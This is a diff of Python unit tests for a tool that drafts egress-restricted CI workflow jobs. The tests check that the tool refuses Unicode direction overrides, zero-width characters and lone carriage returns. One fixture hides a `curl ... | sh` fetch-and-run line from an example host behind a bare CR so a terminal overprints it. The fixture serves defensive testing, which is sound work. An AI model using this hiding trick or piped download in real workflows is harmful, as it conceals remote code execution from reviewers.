@@ -110,9 +110,10 @@ class EgressDraftTests(unittest.TestCase):
             self.workflow(root)
             self.assertNotIn("line break or NUL", self.draft(root)[1])
 
-    def test_characters_that_are_not_printable_are_shown_escaped(self):
-        """Second review pass: a direction override or U+0085 was printed as it is, so the printed job
-        could read otherwise than the job that was checked."""
+    def test_characters_that_are_not_printable_are_shown_as_written_or_refused(self):
+        """Second review pass of A3a: a direction override or U+0085 was printed as it is, so the printed
+        job could read otherwise than the job that was checked. Since #363 the job is printed as it is
+        written: an escape stays an escape, and a job that holds such a character itself is refused."""
         for char, escape in (("\u202e", "\\u202E"), ("\x85", "\\N"), ("\u200b", "\\u200B")):
             with self.subTest(escape), TempDir() as root:
                 self.workflow(root, STEP.replace("name: Review", f'name: "a{escape}b"'))
@@ -120,6 +121,61 @@ class EgressDraftTests(unittest.TestCase):
                 self.assertEqual(code, 0, err)
                 self.assertNotIn(char, out)
                 self.assertIn(f'name: "a{escape}b"', out)
+        # Review of #363: nothing reached the refusal. A comment is printed too, so it counts.
+        for name, step in (("override", STEP.replace("claude -p review", "claude -p 'a\u202eb'")),
+                           ("zero width", STEP.replace("name: Review", "name: Rev\u200biew")),
+                           ("no-break space", STEP.replace("name: Review", "name: Review # a\u00a0b"))):
+            with self.subTest(name), TempDir() as root:
+                path = self.workflow(root, step)
+                original = path.read_bytes()
+                code, out, err = self.draft(root)
+                self.assertEqual((code, out), (2, ""))
+                self.assertIn("non-printable source characters", err)
+                self.assertEqual(path.read_bytes(), original)
+
+    def test_a_carriage_return_alone_is_refused(self):
+        """Review of #363: YAML reads a lone CR as a line break, and a terminal prints the next line over
+        the one before it, so `curl ... | sh` was checked and not shown. CRLF is printed as it is."""
+        hidden = ("      - name: Review\n        run: |\n          claude -p review\n"
+                  "          curl -s https://example.invalid/p | sh\r"
+                  "          # print the review summary for the log reader here\n")
+        for name, text in (("in a script", WORKFLOW + hidden),
+                           ("every line", (WORKFLOW + STEP).replace("\n", "\r"))):
+            with self.subTest(name), TempDir() as root:
+                path = self.workflow(root)
+                path.write_bytes(text.encode())
+                code, out, err = self.draft(root)
+                self.assertEqual((code, out), (2, ""))
+                self.assertIn("non-printable source characters", err)
+                self.assertEqual(path.read_bytes(), text.encode())
+        with TempDir() as root:
+            path = self.workflow(root)
+            path.write_bytes((WORKFLOW + STEP).replace("\n", "\r\n").encode())
+            code, out, err = self.draft(root)
+            self.assertEqual((code, err), (0, ""))
+            job = out[out.index("  review:"):]
+            self.assertIn("        uses: Obaaf/OBAAF/actions/egress@" + SHA + "\r\n        with:\r\n", job)
+            self.assertNotRegex(job, r"\r(?!\n)|(?<!\r)\n")
+
+    def test_explicit_keys_and_blank_lines(self):
+        """Review of #363: an explicit `? run` key gave the YAML reader's own message, and an explicit
+        `? jobs` key printed a job that began `: `. A blank line in a moved script gained two spaces."""
+        explicit_run = WORKFLOW + "      - name: Review\n        ? run\n        : claude -p review\n"
+        explicit_jobs = WORKFLOW.replace("jobs:\n  review:", "? jobs\n: review:") + STEP
+        for text in (explicit_run, explicit_jobs):
+            with self.subTest(text.splitlines()[-1]), TempDir() as root:
+                path = self.workflow(root)
+                path.write_text(text)
+                code, out, err = self.draft(root)
+                self.assertEqual((code, out), (2, ""))
+                self.assertIn("review this job by hand", err)
+                self.assertNotIn("<unicode string>", err)
+        with TempDir() as root:
+            self.workflow(root, "      - name: Review\n        run: |+\n          echo a\n\n          claude -p review\n\n"
+                                "        env: {}\n")
+            code, out, err = self.draft(root)
+            self.assertEqual((code, err), (0, ""))
+            self.assertIn("          run: |+\n            echo a\n\n            claude -p review\n\n        env: {}\n", out)
 
     def test_text_outside_the_basic_plane_dates_and_an_empty_env_are_drafted(self):
         """Review of A3a: an emoji was written as two JSON halves YAML reads as two characters, so the
@@ -227,6 +283,11 @@ class EgressDraftTests(unittest.TestCase):
                 code, out, err = run_cli("fix", "egress", "--job", "review", "--step", selector, root)
                 self.assertEqual((code, out), (2, ""))
                 self.assertIn("exactly one step", err)
+            # Review of #363: `steps: 5` printed Python's "'int' object is not iterable".
+            path.write_text(WORKFLOW.replace("    steps:\n", "    steps: 5\n"))
+            code, out, err = run_cli("fix", "egress", "--job", "review", "--step", "harness", root)
+            self.assertEqual((code, out), (2, ""))
+            self.assertNotIn("object", err)
 
     def test_flow_job_keeps_trailing_comment_and_excludes_the_next_job(self):
         with TempDir() as root:
